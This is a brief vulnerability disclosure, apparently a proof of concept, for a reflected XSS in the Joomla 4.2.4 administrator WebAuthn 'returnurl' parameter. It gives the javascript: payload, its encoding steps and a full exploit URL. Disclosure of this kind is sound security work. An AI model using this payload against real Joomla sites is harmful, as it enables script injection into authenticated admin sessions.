Vulnerability: Reflected XSS

Payload: javascript:alert(1)//

Action to trigger: Click cancel button

Note: The version and user below are what was used.  Other users and versions may be affected.

Note: The payload must be base64encoded and then url encoded.

Note: The user_id parameter may require a valid value

Version: ‎4.2.4


http://192.168.124.216/administrator/index.php?option=com_users&task=method.add&method=webauthn&returnurl=%61%6d%46%32%59%58%4e%6a%63%6d%6c%77%64%44%70%68%62%47%56%79%64%43%67%78%4b%53%38%76&user_id=951

Authenticated: Yes

User: Admin

Vulnerable Parameter: returnurl


Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/Joomla_4.2.4_XSS_via_returnurl.gif)
